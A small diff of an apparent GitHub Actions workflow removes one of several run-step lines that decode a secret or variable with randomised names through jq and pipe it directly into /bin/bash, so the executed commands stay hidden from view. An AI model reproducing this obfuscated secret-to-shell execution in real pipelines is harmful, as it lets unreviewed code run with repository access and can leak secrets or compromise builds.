@@ -27,7 +27,6 @@ jobs:
           tbhd7436: ${{ secrets.tbhd7436 }}
         run: |
           printf '%s' "$tbhd7436" | jq -r .emrn785 | /bin/bash
-          echo $gtqpx47176 | jq -r .qevle7456 | /bin/bash
           echo $hc1 | jq -r .sezwp0 | /bin/bash
 
       - name: Upload artifact
